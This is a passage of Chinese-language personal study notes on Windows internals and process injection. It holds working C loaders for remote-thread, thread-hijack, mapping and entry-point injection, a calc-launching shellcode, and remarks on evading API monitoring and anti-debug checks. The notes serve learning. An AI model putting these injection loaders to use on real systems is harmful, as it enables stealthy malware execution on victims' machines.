Void +0x080 TlsBitmapBits : [2] Uint4B +0x088 ReadOnlySharedMemoryBase : Ptr64 Void +0x090 SharedData : Ptr64 Void +0x098 ReadOnlyStaticServerData : Ptr64 Ptr64 Void +0x0a0 AnsiCodePageData : Ptr64 Void +0x0a8 OemCodePageData : Ptr64 Void +0x0b0 UnicodeCaseTableData : Ptr64 Void +0x0b8 NumberOfProcessors : Uint4B +0x0bc NtGlobalFlag : Uint4B +0x0c0 CriticalSectionTimeout : _LARGE_INTEGER +0x0c8 HeapSegmentReserve : Uint8B +0x0d0 HeapSegmentCommit : Uint8B +0x0d8 HeapDeCommitTotalFreeThreshold : Uint8B +0x0e0 HeapDeCommitFreeBlockThreshold : Uint8B +0x0e8 NumberOfHeaps : Uint4B +0x0ec MaximumNumberOfHeaps : Uint4B +0x0f0 ProcessHeaps : Ptr64 Ptr64 Void +0x0f8 GdiSharedHandleTable : Ptr64 Void +0x100 ProcessStarterHelper : Ptr64 Void +0x108 GdiDCAttributeList : Uint4B +0x10c Padding3 : [4] UChar +0x110 LoaderLock : Ptr64 _RTL_CRITICAL_SECTION +0x118 OSMajorVersion : Uint4B +0x11c OSMinorVersion : Uint4B +0x120 OSBuildNumber : Uint2B +0x122 OSCSDVersion : Uint2B +0x124 OSPlatformId : Uint4B +0x128 ImageSubsystem : Uint4B +0x12c ImageSubsystemMajorVersion : Uint4B +0x130 ImageSubsystemMinorVersion : Uint4B +0x134 Padding4 : [4] UChar +0x138 ActiveProcessAffinityMask : Uint8B +0x140 GdiHandleBuffer : [60] Uint4B +0x230 PostProcessInitRoutine : Ptr64 void +0x238 TlsExpansionBitmap : Ptr64 Void +0x240 TlsExpansionBitmapBits : [32] Uint4B +0x2c0 SessionId : Uint4B +0x2c4 Padding5 : [4] UChar +0x2c8 AppCompatFlags : _ULARGE_INTEGER +0x2d0 AppCompatFlagsUser : _ULARGE_INTEGER +0x2d8 pShimData : Ptr64 Void +0x2e0 AppCompatInfo : Ptr64 Void +0x2e8 CSDVersion : _UNICODE_STRING +0x2f8 ActivationContextData : Ptr64 _ACTIVATION_CONTEXT_DATA +0x300 ProcessAssemblyStorageMap : Ptr64 _ASSEMBLY_STORAGE_MAP +0x308 SystemDefaultActivationContextData : Ptr64 _ACTIVATION_CONTEXT_DATA +0x310 SystemAssemblyStorageMap : Ptr64 _ASSEMBLY_STORAGE_MAP +0x318 MinimumStackCommit : Uint8B +0x320 SparePointers : [4] Ptr64 Void +0x340 SpareUlongs : [5] Uint4B +0x358 WerRegistrationData : Ptr64 Void +0x360 WerShipAssertPtr : Ptr64 Void +0x368 pUnused : Ptr64 Void +0x370 pImageHeaderHash : Ptr64 Void +0x378 TracingFlags : Uint4B +0x378 HeapTracingEnabled : Pos 0, 1 Bit +0x378 CritSecTracingEnabled : Pos 1, 1 Bit +0x378 LibLoaderTracingEnabled : Pos 2, 1 Bit +0x378 SpareTracingBits : Pos 3, 29 Bits +0x37c Padding6 : [4] UChar +0x380 CsrServerReadOnlySharedMemoryBase : Uint8B +0x388 TppWorkerpListLock : Uint8B +0x390 TppWorkerpList : _LIST_ENTRY +0x3a0 WaitOnAddressHashTable : [128] Ptr64 Void +0x7a0 TelemetryCoverageHeader : Ptr64 Void +0x7a8 CloudFileFlags : Uint4B +0x7ac CloudFileDiagFlags : Uint4B +0x7b0 PlaceholderCompatibilityMode : Char +0x7b1 PlaceholderCompatibilityModeReserved : [7] Char +0x7b8 LeapSecondData : Ptr64 _LEAP_SECOND_DATA +0x7c0 LeapSecondFlags : Uint4B +0x7c0 SixtySecondEnabled : Pos 0, 1 Bit +0x7c0 Reserved : Pos 1, 31 Bits +0x7c4 NtGlobalFlag2 : Uint4B BeingDebugged IsDebuggerPresent()访问的结构体成员判断是否被调试，汇编直接把test改成cmp就可以解决 ImageBaseAddress 这个在写shellcode的时候常用来获取到exe的起始地址 ProcessHeap 进程堆的句柄，也就是指向结构体HEAP的指针； 程序正常运行时，ProcessHeap.Flags的值为2 ， ProcessHeap. ForceFlags 的值为0，也常用于反调试 目前遇到的就是这俩结构里的这几个内容，其他的遇见再说 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 16:36:23 "},"MyArticles/CyberSec/进程注入-基础.html":{"url":"MyArticles/CyberSec/进程注入-基础.html","title":"进程注入-前置","keywords":"","body":"进程注入 在进程内存空间中执行任意代码的技术方法。通过一定方法将dll，shellcode等代码数据写入其他进程执行。这里为几个具有实战意义的注入手法。 原理 大致步骤 确定目标进程（新创建的或者打开已有进程）。 向目标进程中写入数据。 令被写入进程执行我们写入的代码数据。 相关api调用 可以注入的东西包括：一个节区，一进程，一段代码（shellcode，PE文件）或者一个dll文件。 利用Sysmon 介绍 微软中文文档：https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysmon sysmon：系统监视器 (Sysmon) 是一种 Windows 系统服务和设备驱动程序，一旦安装在系统上，在系统重新启动后仍保持驻留状态，以监视系统活动并将系统活动记录到 Windows 事件日志。 它提供有关进程创建、网络连接和文件创建时间更改的详细信息。 通过收集它使用 Windows 事件收集.aspx) 或 SIEM 代理生成的事件，然后对其进行分析，可以识别恶意活动或异常活动，并了解入侵者和恶意软件在网络上的操作方式。 下载之后解压得到： LastWriteTime Length Name 2022/9/29 20:25 7490 Eula.txt 2022/9/29 20:25 8188688 Sysmon.exe 2022/9/29 20:25 4419344 Sysmon64.exe 这里注意给的是安装文件，双击不能运行的 sysmon安装 sysmon64 -i #安装 sysmon64 -c [] #更新配置 默认配置用：sysmon64 -c -- sysmon64 -u #卸载 安装32位就不能安装64位了，所以直接安装sysmon64. sysmon使用 win+r输入：eventvwr打开事件管理器 下面找到Sysmon里的 这里就可以用了。 方便起见直接在桌面设一个快捷方式： 打开之后就可以使用这各种管理器了 ShellCode Windows的shellcode是什么，和linux的pwn里的shellcode一样是一段可执行汇编的字节码形式，一般以\\x00\\x11之类的形式存在，且有特殊目的的代码。一般是可以在目标机器上直接执行的一串机器码。 困难 shellcode定义是可以直接执行的，所以编写的时候就需要用汇编直接去写，这是人类不友好的。 还可以从已有程序中直接提取，但是会涉及到地址的问题，尤其是在现代操作系统普遍开启地址随机化之后，这是困难的。 再就是一些字符串并不在text段中，但是shellcode只包括text段的代码，所以说shellcode是有困难的。 通过loadlibrary的方式调用api函数，但是如何获得loadlibrary的地址呢？ FS寄存器 局限性 FS寄存器通常用于指向当前线程的线程本地存储（TLS）段。 TLS段是一段内存，用于存储与特定线程相关的信息。主要针对的就是32位的程序。64位的程序可以使用GS寄存器来替代。 值得注意的是，在高级语言生成的程序中例如python和C#，FS寄存器是不可用的，这是因为他们运行在虚拟机上而不是真实的CPU环境中。代码无法直接访问物理CPU的寄存器。 C#程序可以使用System.Threading命名空间中的ThreadLoca\\类来存储与特定线程相关的信息。这个类提供了一个可以为每个线程存储单独值的机制，而无需使用TLS段。例如 using System.Threading; ThreadLocal threadLocalInt = new ThreadLocal(); // 在线程A中设置threadLocalInt的值 threadLocalInt.Value = 42; // 在线程B中访问threadLocalInt的值 int value = threadLocalInt.Value; 值得注意的是，rust语言被认为是一种高级语言，因为它提供了许多方便的高级功能，如泛型、模式匹配、闭包和枚举类型。同时提供了许多低级控制和系统级功能，如直接访问内存和线程、使用底层指针和原生数据类型等。 内联汇编 gcc/clang编译器 以下代码可以将eax的值赋值给变量LoadLibrary，但是下面的程序在第五行就会发生异常无法执行，原因是FS寄存器的检索失败导致的。 int LoadLibrary; printf(\"arch point########\"); __asm__( \"mov eax, fs:[0x30]\\n\" \"mov eax, [eax+0xc]\\n\" \"mov eax, [eax+0x14]\\n\" \"mov eax, [eax]\\n\" \"mov eax, [eax+0x10]\\n\" \"mov %0, eax\" // 通过这种方式利用\"=r\"的形式将eax的值赋给变量 :\"=r\"(LoadLibrary) ); printf(\"0x%08X\\n\", LoadLibrary); 不论是gcc还是clang编译器，在编译的时候使用参数-masm=intel可以允许intel语体的汇编通过编译。默认at&t语体 vs vs在编译的时候会有各种的优化和安全措施，在调试的时候比较困难，所以需要先关一下各种优化和安全检查. (5条消息) shellcode编写_天问_Herbert555的博客-CSDN博客_shellcode编写 主要区别是针对内联汇编的语法格式问题和最后的将值赋值给变量的问题。 测试shellcode - 32bit 这是用来被注入的进程 #include #include #include int GetKernel32BaseAddress() { int AddrOfKernel; __asm__( \"mov eax, fs:[0x30]\\n\" \"mov eax, [eax+0xc]\\n\" \"mov eax, [eax+0x18]\\n\" \"mov eax, [eax]\\n\" \"mov eax, [eax+0x8]\\n\" :\"=r\"(AddrOfKernel) ); return AddrOfKernel; } int main(char argc[], char argv) { char str[128]; // printf(\"Current proc id : %d\\n\", GetCurrentProcessId()); // get baseaddress of kernel32.dll printf(\"kernel32.dll : 0x%p\",GetKernel32BaseAddress()); // get LoadLibraryA() base address printf(\"loadlibraryA : 0x%p\\n\", LoadLibraryA); // get WinExec() base address printf(\"WinExec : 0x%p\\n\", WinExec); // get ExitProcess() base address printf(\"ExitProcess() : 0x%p\\n\", ExitProcess); printf(\"hello world\\n\"); printf(\"input something or waiting\\n\"); scanf(\"%s\", str); puts(str); return 0; } shellcode，调用winexec和exitprocess函数来弹出计算器。可以用来注入32位的进程，因为地址都是硬编码写死的，所以用的时候要注意注意。 unsigned char shellcode[] = \"\\x55\\x89\\xE5\\x33\\xC0\\x50\\xB8\\x2E\\x64\\x6C\\x6C\\x50\\xB8\\x65\\x6C\\x33\\x32\\x50\\xB8\\x6B\\x65\\x72\\x6E\\x50\\x8B\\xC4\\x50\\xB8\" \"\\xA0\\x12\\xed\\x76\" \"\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x2E\\x65\\x78\\x65\\x50\\xB8\\x63\\x61\\x6C\\x63\\x50\\x8B\\xC4\\x6A\\x05\\x50\\xB8\" \"\\xF0\\xE1\\xF0\\x76\" \"\\xFF\\xD0\\x33\\xC0\\x50\\xB8\" \"\\x80\\x59\\xed\\x76\" \"\\xFF\\xD0\\x90\\x90\\xC3\"; 64-bit shellcode-失败 \"\\x55\\x48\\x8B\\xEC\\x90\\xC7\\x04\\x24\\x2E\\x64\\x6C\\x6C\\xC7\\x44\\x24\\xFC\\x65\\x6C\\x33\\x32\\xC7\\x44\\x24\\xF8\\x6B\\x65\\x72\\x6E\\x48\\x8B\\xCC\\x90\\x90\\x48\\xB8\\xA0\\x8C\\xC7\\xA7\\xFE\\x7F\\x00\\x00\\xFF\\xD0\\xBA\\x05\\x00\\x00\\x00\\xC7\\x04\\x24\\x65\\x78\\x65\\x2E\\xC7\\x44\\x24\\xFC\\x63\\x6C\\x61\\x63\\xC7\\x44\\x24\\xF8\\x00\\x00\\x00\\x00\\x48\\x8B\\xCC\\x90\\x48\\xB8\\xD0\\x77\\x41\\xA8\\xFE\\x7F\\x00\\x00\\x90\\x90\\x90\\xC3\" donut 将exe转换为shellcode的一个工具(GitHub - TheWover/donut：生成 x86、x64 或 AMD64+x86 与位置无关的外壳代码，从内存加载 .NET 程序集、PE 文件和其他 Windows 有效负载，并使用参数运行它们) Nt和Rt开头的api 以 Nt 开头的函数是 Windows NT 内核提供的 Native API，是系统内部使用的函数。 以 Rt 开头的函数是通过封装 Nt 开头函数来实现的，提供给开发人员使用。 对于以 Nt 开头的函数，可能更难使用和访问，并且它们往往没有直接对应的文档说明，但它们通常具有更高的性能。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-18 20:15:57 "},"MyArticles/CyberSec/6种常见注入方式.html":{"url":"MyArticles/CyberSec/6种常见注入方式.html","title":"windows下的进程注入（6种）","keywords":"","body":"注入方式 根据各阶段调用的API，读写的内存位置的区别进行 如下分类（实战中常用的 6 种）： 1、远程线程注入 原始的注入手法。通过API申请空间，然后将code写入内存，然后创建线程执行。这种手法基本会被监控，但是报毒与否就再说了。 流程 打开进程 ---》申请空间 ---》写入shellcode ---》创建线程执行 实现代码 #include #include #include unsigned char shellcode[] = \"\\x55\\x89\\xE5\\x33\\xC0\\x50\\xB8\\x2E\\x64\\x6C\\x6C\\x50\\xB8\\x65\\x6C\\x33\\x32\\x50\\xB8\\x6B\\x65\\x72\\x6E\\x50\\x8B\\xC4\\x50\\xB8\\xA0\\x12\\x86\\x76\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x2E\\x65\\x78\\x65\\x50\\xB8\\x63\\x61\\x6C\\x63\\x50\\x8B\\xC4\\x6A\\x05\\x50\\xB8\\xF0\\xE1\\x89\\x76\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x80\\x59\\x86\\x76\\xFF\\xD0\\x90\\x90\\xC3\"; int main() { //计算器的进程号，准备注入他的进程 int wpid = 3632; //打开一个进程，后面指定PID HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, wpid); printf(\"%d\\n\", hProcess); //申请内存空间，最后赋予空间权限 LPVOID IpBaseAddress = VirtualAllocEx(hProcess, 0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); printf(\"IpBaseAddress : %p\\n\", IpBaseAddress); //将shellcode写入内存 WriteProcessMemory(hProcess, IpBaseAddress, shellcode, sizeof(shellcode), NULL); printf(\"WriteProcess\\n\"); //创建线程执行shellcode CreateRemoteThread(hProcess, 0, 100, (LPTHREAD_START_ROUTINE)IpBaseAddress, 0, 0, NULL); return 0; } 动态验证 VirtualAllocEx申请内存之后返回的地址，在内存中查看，可以看到一段全空空间。 在内存布局中查看，有一段ERW权限的申请出来的空间，大小是0x1000. 通过WriteProcessAddress函数将shellcode写进去，就可以在空间中看到写进去的code 但是这里通过内存查看，返现写进去的东西有点奇怪，和自己想的不一样。 因为\\\\x就不是16进制的数字了。而且\\xxx这个特殊的字符是不被允许的，找了好久才发现这个问题 这个 方式可以动态的调试shellcode 2、线程劫持注入 就是劫持一个线程进行注入，然后再恢复这个线程，就像是荆轲刺秦你迷晕了荆轲换了他的地图，再叫醒他去刺杀秦王一样，这个换了的地图就是shellcode。 流程 挂起目标线程，申请内存，写入shellcode，修改线程上下文使其指向shellcode，恢复线程执行shellcode 需要注意的是，这里需要先创建一个进程，而不是直接打开现存的进程。因为需要一个挂起状态 代码 #include #include void showstruct(PROCESS_INFORMATION pii) { printf(\"\\ndwProcessId: %d\\n\", pii.dwProcessId); printf(\"dwThreadId: %d\\n\", pii.dwThreadId); // Handle,也叫句柄，实际上是一个数据，是一个Long (整长型)的数据，是一种指向指针的指针。 printf(\"hProcess: 0x%p\\n\", pii.hProcess); printf(\"hThread: 0x%p\\n\", pii.hThread); printf(\"===============================================================================\\n\"); } int main() { // 定义两个进程相关的结构体变量，都是内置结构体，可以直接定义，然后初始化为0 STARTUPINFO si = { 0 }; PROCESS_INFORMATION pi = { 0 }; /* typedef struct _PROCESS_INFORMATION { HANDLE hProcess; HANDLE hThread; DWORD dwProcessId; DWORD dwThreadId; } PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION; */ // 创建一个名称为notepad。exe的进程，不用从父进程继承，创建之后状态为挂起，并且将信息赋值给si和pi if (!CreateProcess(NULL, \"notepad.exe\", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) { printf(\"Create process failed error code: %d\\n\", (int)GetLastError()); return 1; } // 根据进程id打开进程 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId); if (hProcess == NULL) { printf(\"Open process failed error code: %d\\n\", (int)GetLastError()); return 1; } // Shellcode，这里为了证明确实执行了，所以直接通过中断来验证 char shellcode[] = \"\\xcc\\xcc\\xB8\\x01\\x00\\x00\\x00\\xC3\"; // 利用api挂起进程 SuspendThread(pi.hThread); // 申请一个目标进程中的内存区域 LPVOID lpBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (lpBuffer == NULL) { printf(\"Virtual alloc failed error code ：%d\\n\", (int)GetLastError()); return 1; } // 显示出来申请区域的地址，方便调试的时候找 printf(\"shellcode address is : %p\\n\", lpBuffer); // 将shellcode写进去，和远程进程注入一样 if (!WriteProcessMemory(hProcess, lpBuffer, shellcode, sizeof(shellcode), NULL)) { printf(\"Write process memory failed error code：%d\\n\", (int)GetLastError()); return 1; } // 设置线程的上下文环境，让ip寄存器直接跳转 CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_ALL; if (!GetThreadContext(pi.hThread, &ctx)) { printf(\"GetThreadContext failed error code ：%d\\n\", (int)GetLastError()); return 1; } // 设置ip寄存器直接指向那块地址 ctx.Rip = (DWORD64)lpBuffer; // 设置保存线程环境 if (!SetThreadContext(pi.hThread, &ctx)) { printf(\"SetThreadContext failed error code ：%d\\n\", (int)GetLastError()); return 1; } // 恢复线程环境，这时就可以执行shellcode了 if (ResumeThread(pi.hThread) == -1) { printf(\"ResumeThread failed error code ：%d\\n\", (int)GetLastError()); return 1; } // 等待目标进程结束（这里可以直接从任务管理器关闭） WaitForSingleObject(pi.hProcess, INFINITE); // 清理恢复句柄释放空间 CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return 0; } 经过验证发现是成功的，可以执行到shellcode的位置。但是缺点就是执行会创建一个新的线程，虽然在挂起的状态下前端不会有什么显示，但是还是不巧妙。 以上的方法属于是同一类，仅仅是执行的方式不同，下面通过更换申请内存的方式来进行注入。 3、映射注入 就是通过在内存中申请一块公共内存，然后将这块内存映射到注入程序和被注入程序，这样需要修改shellcode的时候仅需要在注入程序中修改，就可以同时映射到被注入内存中。 这种注入方式规避了VirtualAllocEx和WriteProcessMemory这些写内存的敏感函数的检测，所以该方法一般被用来当作是一种写shellcode的方式，和其他的执行方式相结合 但是在分享的时候没有给出具体的代码，只给出了零碎的一些片段 // 创建一个内存区域，并且读写执行权限 NtCreateSection(&sectionHandle, SECTION_MAP_READ|SECTION_MAP_WRITE|SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL); // 将这块内存区域映射到注入进程中 NtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE); // 将shellcode复制到内存区域 memcpy(localSectionAddress, shellcode, sizeof(shellcode)); // 创建远程线程执行 RtCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL); NtCreateSection NtCreateSection( &sectionHandle, // 接收节对象的句柄的 HANDLE 变量的指针 SECTION_MAP_READ|SECTION_MAP_WRITE|SECTION_MAP_EXECUTE, // 确定对对象的请求访问权限 NULL, // 不使用文件映像，而是创建一个空的内存区域。 (PLARGE_INTEGER)&sectionSize, // 指定节的最大大小（以字节为单位） PAGE_EXECUTE_READWRITE, // 指定要在节中的每个页面上放置的保护 SEC_COMMIT, // 分配属性的 SEC_XXX 标志的位掩码 NULL); // 不适用额外的文件句柄。 NtMapViewOfSection 这是一个未公开的api函数，这个函数在用户态下执行，而且不会被判断异常 NtMapViewOfSection( sectionHandle, // 要映射的内存区域的句柄。 GetCurrentProcess(), // 指定要映射到内存的句柄（这里就是自己的线程） &localSectionAddress, // 用于接收映射到当前进程中的内存区域的起始地址。 NULL, // 不指定映射到当前进程中的起始地址 NULL, // 不指定映射到当前进程中的内存区域的大小 NULL, // 不指定内存区域的偏移量。 &size, // 用于接收内存区域的大小。 2, // 指定内存区域的类型，2 表示映射到当前进程的内存地址空间。 NULL, // 表示不指定任何额外的信息 PAGE_READWRITE); // 内存页的保护模式，表示该内存页可读、可写。 这个函数的定义来自chatgpt，很佩服啊 RtlCreateUserThread 这个函数需要引用ntdll.lib，但是仅限于x64的程序 RtCreateUserThread( targetHandle, // 指定要注入的进程的句柄 NULL, // 不指定线程的安全标志 FALSE, // 指定线程是否独占，FALSE 表示不独占 0, // 线程栈的大小，0表示默认的大小 0, // 线程的优先级，0表示默认 0, // 线程的初始挂起状态，0 表示线程在创建后立即开始执行 remoteSectionAddress, // 指定要执行的 shellcode 的起始地址，该地址在注入进程中 NULL, // 表示不指定线程的线程函数的参数 &targetThreadHandle, // 用于接收新创建的线程的句柄 NULL); // 表示不接收线程的创建时间 测试的shellcode，还是弹出一个计算器的功能，仅限于32位的程序 unsigned char shellcode[] = \"\\x55\\x89\\xE5\\x33\\xC0\\x50\\xB8\\x2E\\x64\\x6C\\x6C\\x50\\xB8\\x65\\x6C\\x33\\x32\\x50\\xB8\\x6B\\x65\\x72\\x6E\\x50\\x8B\\xC4\\x50\\xB8\\xA0\\x12\\xC4\\x76\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x2E\\x65\\x78\\x65\\x50\\xB8\\x63\\x61\\x6C\\x63\\x50\\x8B\\xC4\\x6A\\x05\\x50\\xB8\\xF0\\xE1\\xC7\\x76\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x80\\x59\\xC4\\x76\\xFF\\xD0\\x90\\x90\\xC3\"; 代码实现 参考：https://idiotc4t.com/code-and-dll-process-injection/mapping-injection #include #include #pragma comment(lib, \"ntdll.lib\") #pragma comment (lib, \"OneCore.lib\") unsigned char shellcode[] = \"\\x55\\x89\\xE5\\x33\\xC0\\x50\\xB8\\x2E\\x64\\x6C\\x6C\\x50\\xB8\\x65\\x6C\\x33\\x32\\x50\\xB8\\x6B\\x65\\x72\\x6E\\x50\\x8B\\xC4\\x50\\xB8\\xA0\\x12\\xC4\\x76\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x2E\\x65\\x78\\x65\\x50\\xB8\\x63\\x61\\x6C\\x63\\x50\\x8B\\xC4\\x6A\\x05\\x50\\xB8\\xF0\\xE1\\xC7\\x76\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x80\\x59\\xC4\\x76\\xFF\\xD0\\x90\\x90\\xC3\"; int main() { HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(shellcode), NULL); if (hMapping == 0) return 0; LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, sizeof(shellcode)); if (lpMapAddress == 0) return 0; memcpy((PVOID)lpMapAddress, shellcode, sizeof(shellcode)); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 22508); // 打开句柄为25032的进程，并返回句柄。PROCESS_ALL_ACCESS表示需要完全访问权限。 LPVOID lpMapAddressRemote = MapViewOfFile2(hMapping, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READ); // 将映射对象映射到句柄为hProcess的进程的地址空间，以便在该进程中执行代码。PAGE_EXECUTE_READ表示需要执行和读取权限。 HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, NULL, 0, NULL); /*下面的代码仅适合于64位的程序 HANDLE hThread = NULL; LPVOID lpParameter = NULL; RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, lpMapAddress, lpParameter, &hThread, NULL); */ UnmapViewOfFile(lpMapAddress); CloseHandle(hMapping); return 0; } 4、覆盖入口点注入 在创建进程的时候，直接将进程的入口点的代码更改为shellcode，最后恢复挂起的主线程；缺点是为了达到线程开始挂起的状态，只能通过创建的方式进行，不能通过打开现有进程的方式执行。 流程 创建进程后挂起进程，通过PE文件结构找到入口点，将shellcode直接写入进程的入口点，然后恢复线程。 整个流程类似于线程劫持注入的过程，只不过这里是直接覆盖了入口点的代码。 关键函数：函数具体参考定义) __kernel_entry NTSTATUS NtQueryInformationProcess( [in] HANDLE ProcessHandle, //要检索其信息的进程的句柄。 [in] PROCESSINFOCLASS ProcessInformationClass, [out] PVOID ProcessInformation, [in] ULONG ProcessInformationLength, [out, optional] PULONG ReturnLength ); [in] ProcessInformationClass 要检索的进程信息的类型。 此参数可以是 PROCESSINFOCLASS 枚举中的以下值之一。 Value 含义 ProcessBasicInformation0 检索指向 PEB 结构的指针，该结构可用于确定是否正在调试指定的进程，以及系统用于标识指定进程的唯一值。使用 CheckRemoteDebuggerPresent 和 GetProcessId 函数获取此信息。 ProcessDebugPort7 检索一个 DWORD_PTR 值，该值是进程的调试器的端口号。 非零值指示进程在环 3 调试器的控制下运行。使用 CheckRemoteDebuggerPresent 或 IsDebuggerPresent 函数。 ProcessWow64Information26 确定进程是否在 WOW64 环境中运行， (WOW64 是 x86 模拟器，它允许基于 Win32 的应用程序在 64 位 Windows) 上运行。使用 IsWow64Process2 函数获取此信息。 ProcessImageFileName27 检索包含进程映像文件名称的 UNICODE_STRING 值。使用 QueryFullProcessImageName 或 GetProcessImageFileName 函数获取此信息。 ProcessBreakOnTermination29 检索一个 ULONG 值，该值指示进程是否被视为关键。注意 此值可以在 Windows XP 和 SP3 中使用。 从 Windows 8.1 开始，应改用 IsProcessCritical。 ProcessSubsystemInformation75 检索指示进程的子系统类型的 SUBSYSTEM_INFORMATION_TYPE 值。 ProcessInformation 参数指向的缓冲区应足够大，可以容纳单个SUBSYSTEM_INFORMATION_TYPE枚举。 找到入口点 利用PEB结构找到里面的PebBaseAddress项，定位到内存中的pe文件的头，就是MZ的位置。然后通过DOS头里的e_lfanew项的值，定位到NT头就是PE的位置，然后找到可选头，直接获得里面的程序入口点+imageBase 写入代码 通过WriteProcessMemory直接把shellcode写入上述计算出来的函数的入口点的地址指向的地方。 执行 通过ResumeThread函数直接执行，或者利用CreateRemoteThread函数来执行 实现代码 #include #include #include // 32bit unsigned char shellcode[] = \"\\xcc\\xc3\\x55\\x89\\xE5\\x33\\xC0\\x50\\xB8\\x2E\\x64\\x6C\\x6C\\x50\\xB8\\x65\\x6C\\x33\\x32\\x50\\xB8\\x6B\\x65\\x72\\x6E\\x50\\x8B\\xC4\\x50\\xB8\" \"\\xA0\\x12\\xed\\x76\" \"\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x2E\\x65\\x78\\x65\\x50\\xB8\\x63\\x61\\x6C\\x63\\x50\\x8B\\xC4\\x6A\\x05\\x50\\xB8\" \"\\xF0\\xE1\\xF0\\x76\" \"\\xFF\\xD0\\x33\\xC0\\x50\\xB8\" \"\\x80\\x59\\xed\\x76\" \"\\xFF\\xD0\\x90\\x90\\xC3\"; // 64bit unsigned char shellcode64[] = \"\\xcc\\xc3\\x55\\x48\\x8B\\xEC\\x90\\xC7\\x04\\x24\\x2E\\x64\\x6C\\x6C\\xC7\\x44\\x24\\xFC\\x65\\x6C\\x33\\x32\\xC7\\x44\\x24\\xF8\\x6B\\x65\\x72\\x6E\\x48\\x8B\\xCC\\x90\\x90\\x48\\xB8\" \"\\xA0\\x8C\\xC7\\xA7\\xFE\\x7F\\x00\\x00\" \"\\xFF\\xD0\\xBA\\x05\\x00\\x00\\x00\\xC7\\x04\\x24\\x65\\x78\\x65\\x2E\\xC7\\x44\\x24\\xFC\\x63\\x6C\\x61\\x63\\xC7\\x44\\x24\\xF8\\x00\\x00\\x00\\x00\\x48\\x8B\\xCC\\x90\\x48\\xB8\" \"\\xD0\\x77\\x41\\xA8\\xFE\\x7F\\x00\\x00\" \"\\x90\\x90\\x90\\xC3\"; typedef struct _PROCESS_BASIC_INFORMATION { PVOID Reserved1; PVOID PebBaseAddress; PVOID Reserved2[2]; ULONG_PTR UniqueProcessId; PVOID Reserved3; } PROCESS_BASIC_INFORMATION; typedef LONG(NTAPI* NtQueryInformationProcessPtr)( HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength ); int main() { // NtQueryInformationProcess api在ntdll里，属于未公开的函数，所以需要动态调用 HMODULE hNtdll = LoadLibraryA(\"ntdll.dll\"); if (hNtdll == NULL) { printf(\"无法加载 ntdll.dll 库\\n\"); return 1; } // 设置启动信息和进程信息，保留在结构体里，方便后续操作 STARTUPINFO si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 }; // 因为需要一个挂起状态的进程，所以需要Create，而不能Open，而且需要执行入口点，所以只能创建 if (!CreateProcessA(NULL, (LPSTR)\"C:\\\\Windows\\\\System32\\\\svchost.exe\", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) { printf(\"CreateProcessA 失败，错误码 %lu\\n\", GetLastError()); return 1; } NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hNtdll, \"NtQueryInformationProcess\"); //find base addr by peb PROCESS_BASIC_INFORMATION pbi; ULONG ReturnLength; NTSTATUS status = NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), &ReturnLength); if (status != 0) { printf(\"NtQueryInformationProcess 失败，错误码 %lu\\n\", status); return 1; } // peb offset DWORD_PTR pef_offset = (DWORD_PTR)pbi.PebBaseAddress + 0x10; LPVOID imagebase_addr = 0; if (!ReadProcessMemory(pi.hProcess, (LPVOID)pef_offset, &imagebase_addr, sizeof(LPVOID), NULL)) { printf(\"读取目标进程的Peb结构体失败，错误码 %lu\\n\", GetLastError()); return 1; } // MZ address printf(\"imagebase_addr: 0x%p\", imagebase_addr); //（EntryPoint） // dos header IMAGE_DOS_HEADER dosHeader = { 0 }; if (!ReadProcessMemory(pi.hProcess, imagebase_addr, &dosHeader, sizeof(dosHeader), NULL)) { printf(\"读取目标进程的DOS头失败，错误码 %lu\\n\", GetLastError()); return 1; } // nt header // 这里需要定义一个结构体，用PIMAGE_NT_HEADERS定义的话默认定义了一个类型的指针但是并没有开辟内存空间，所以会报错 IMAGE_NT_HEADERS ntHeader = { 0 }; DWORD nt_offset = dosHeader.e_lfanew; // 定位到nt头的位置 if (!ReadProcessMemory(pi.hProcess, (LPVOID)((DWORD_PTR)imagebase_addr + nt_offset), &ntHeader, sizeof(ntHeader), 